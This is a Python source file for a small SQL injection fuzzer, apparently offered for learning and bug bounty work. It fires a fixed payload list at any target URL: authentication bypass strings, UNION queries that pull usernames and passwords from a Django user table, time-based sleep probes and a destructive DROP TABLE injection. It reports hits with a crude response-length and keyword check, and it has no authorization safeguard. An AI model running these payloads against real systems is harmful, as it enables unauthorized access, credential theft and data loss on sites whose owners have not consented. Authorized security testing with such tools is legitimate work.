# sql_fuzzcat.py - Lightweight SQL Injection fuzzer inspired by sqlmap and ffuf and cats ^o.o^
# Optimized for low spec hardware: minimal deps, efficient loops, optional async
# Security: Input validation, no eval/exec. Usage: python light_sqli_fuzzer.py -u <url> -p <param>
# Author: samsepiol-alt - for learning purposes
# Install: pip install requests, aiohttp 
# Example: python sql_fuzzcat.py -u "http://example.com/search?q={query}" -p query

import sys
import argparse
import urllib.parse
import re

try:
    import aiohttp
    import asyncio
    ASYNC = True
except ImportError:
    import requests
    ASYNC = False
    print("Warning: aiohttp not found. Using synchronous requests (slower but lighter).")

# based in PayloadAllThings repo
payloads = [
    "' OR 1=1 --",  #boolean-based, bypass auth
    "' OR 'a'='a",   # generic true condition
    "1' UNION SELECT NULL, NULL --",  # Union-based, adjust NULLs
    "' AND (SELECT COUNT(*) FROM pg_sleep(5)) --",  # PostgreSQL time-based
    "' AND SLEEP(5)#",  # MySQL time-based
    "'; DROP TABLE test; --",  #Error-based (test impact)
    "' UNION SELECT username, password FROM auth_user --",  # Django user table
    "%27%20OR%201=1--",  # URL-encoded
]

def validate_url(url):
    """Security: Validate URL to prevent injection or malformed input."""
    parsed = urllib.parse.urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        raise ValueError("Invalid URL. Use http://example.com/path?param={placeholder}")
    return url

async def test_payload_async(session, base_url, param, payload):
    """Async test for efficiency on supported systems."""
    try:
        encoded = urllib.parse.quote(payload)
        url = base_url.replace(f"{{{param}}}", encoded)
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            # Check for success: response length, errors, or data dump
            if len(text) > 1000 or "error" in text.lower() or re.search(r"(user|password|admin)", text, re.I):
                return f"Potential SQLi: {payload} at {url}\nResponse snippet: {text[:200]}"
    except Exception as e:
        return f"Error with {payload}: {str(e)}"
    return None

def test_payload_sync(base_url, param, payload):
    """Synchronous fallback for low-spec systems."""
    try:
        encoded = urllib.parse.quote(payload)
        url = base_url.replace(f"{{{param}}}", encoded)
        resp = requests.get(url, timeout=10)
        text = resp.text
        if len(text) > 1000 or "error" in text.lower() or re.search(r"(user|password|admin)", text, re.I):
            return f"Potential SQLi: {payload} at {url}\nResponse snippet: {text[:200]}"
    except Exception as e:
        return f"Error with {payload}: {str(e)}"
    return None

async def main_async(args):
    url = validate_url(args.url)
    async with aiohttp.ClientSession() as session:
        tasks = [test_payload_async(session, url, args.param, p) for p in payloads]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res:
                print(res)

def main_sync(args):
    url = validate_url(args.url)
    for p in payloads:
        res = test_payload_sync(url, args.param, p)
        if res:
            print(res)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Lightweight SQL Injection Fuzzer for Bug Bounty")
    parser.add_argument("-u", "--url", required=True, help="Target URL with {param} placeholder, e.g., http://example.com/search?q={query}")
    parser.add_argument("-p", "--param", required=True, help="Parameter name, e.g., query")
    args = parser.parse_args()

    if ASYNC and args.url.startswith("http"):  # Ensure async only for valid URLs
        asyncio.run(main_async(args))
    else:
        main_sync(args)